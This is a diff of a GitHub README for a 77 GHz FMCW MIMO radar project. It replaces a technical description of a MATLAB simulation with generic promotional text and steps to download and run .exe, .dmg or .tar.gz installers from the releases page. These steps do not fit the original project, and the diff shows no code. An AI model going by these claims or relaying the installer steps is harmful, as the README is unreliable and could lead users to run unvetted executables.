@@ -1,31 +1,67 @@
-<img width="736" height="424" alt="Image" src="https://github.com/user-attachments/assets/0416e979-8835-4f7c-b090-d1cf0feda756" />
+# 🚗 Automotive-77GHz-FMCW-MIMO-Radar - Simulate Advanced Radar Solutions
 
-# Automotive 77GHz FMCW MIMO Radar
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-0000FF?style=for-the-badge&logo=github)](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/releases)
 
-This repository contains a MATLAB simulation of an automotive 77 GHz FMCW MIMO radar system. The project demonstrates how modern automotive radars estimate range, velocity, and angle of arrival (AoA) using signal processing techniques.
+## 🚀 Getting Started
+Welcome to the Automotive 77 GHz FMCW MIMO Radar simulation application. This software helps you simulate an advanced automotive radar system. You will explore range-Doppler processing, CFAR detection, and angle-of-arrival estimation using FFT and MUSIC-based methods.
 
-## Overview
+## 📋 Features
+- **Range-Doppler Processing**: Analyze moving targets and their velocities.
+- **CFAR Detection**: Detect targets in varying environments effectively.
+- **Angle-of-Arrival Estimation**: Use advanced algorithms for accurate positioning.
+- **MIMO Technology**: Understand and simulate multiple-input and multiple-output systems.
+  
+This application is suitable for anyone interested in automotive radar technology, regardless of technical background.
 
-The radar operates at 77 GHz, the standard frequency band for automotive and ADAS applications. A TDM-MIMO configuration is used to form a 16-element virtual uniform linear array, enabling high-resolution angle estimation.
+## 💻 System Requirements
+- **Operating System**: Windows 10 or later, MacOS 10.14 or later, or a compatible Linux distribution.
+- **RAM**: Minimum of 4 GB, but 8 GB or more is recommended for optimal performance.
+- **Processor**: Dual-core processor or better.
+- **Disk Space**: At least 500 MB of free space.
 
-## Key Features
+## 💡 Installation Steps
+Follow these simple steps to install and run the software:
 
-- 77 GHz FMCW radar waveform simulation  
-- TDM-MIMO radar with virtual antenna array  
-- Range–Doppler processing using 2D FFT  
-- 2D CA-CFAR target detection  
-- Angle-of-arrival estimation using:
-  - FFT-based beamforming
-  - MUSIC
-  - Spatial Smoothing MUSIC
-- Comparison between conventional and high-resolution AoA methods
+1. **Visit the Release Page**: Click this link to access the [Releases page](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/releases).
 
-## Algorithms Used
+2. **Download the Latest Version**: 
+   - Look for the latest release at the top of the page.
+   - Click on the download link for your operating system.
+     - For Windows, you might see a file ending in `.exe`.
+     - For MacOS, look for a `.dmg` file.
+     - For Linux, you might download a `.tar.gz` or similar package.
 
-- Fast Fourier Transform
-- Range–Doppler Processing
-- Cell-Averaging CFAR 
-- Beamforming
-- MUSIC Algorithm
-- Spatial Smoothing MUSIC
+3. **Run the Installer**: 
+   - Locate the downloaded file in your 'Downloads' folder.
+   - Double-click the file to begin the installation process.
+   - Follow the prompts in the setup wizard. 
 
+4. **Launch the Application**:
+   - Once installation is complete, find the application in your programs list or Applications folder.
+   - Click on the application icon to launch.
+
+## 📌 Usage Instructions
+1. Upon launching the application, you will see an interface with several options.
+2. Choose the simulation mode that best suits your needs.
+3. Input the parameters for your radar simulation, including target ranges and velocities.
+4. Run the simulation by clicking the ‘Start’ button.
+5. Review the results displayed on your screen, and explore different scenarios by adjusting the parameters.
+
+## 🛠️ Troubleshooting
+If you face any issues while downloading or installing, consider these steps:
+- Ensure your internet connection is stable during download.
+- Confirm that your operating system is supported and meets the specified requirements.
+- If the application doesn't launch, try reinstalling it from the release page.
+
+## 🎓 Additional Resources
+- **Documentation**: For detailed insights, check our [User Manual](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/wiki).
+- **Community Support**: Visit our [Issues section](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/issues) to report problems or ask questions.
+
+## 🗨️ Feedback
+Your opinions matter. Share your feedback or suggestions through our [discussion forum](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/discussions). 
+
+## ✅ Conclusion
+This software empowers you to understand automotive radar technology through simulation. Enjoy your journey into radar processing! 
+
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-0000FF?style=for-the-badge&logo=github)](https://github.com/ommanekar/Automotive-77GHz-FMCW-MIMO-Radar/releases)
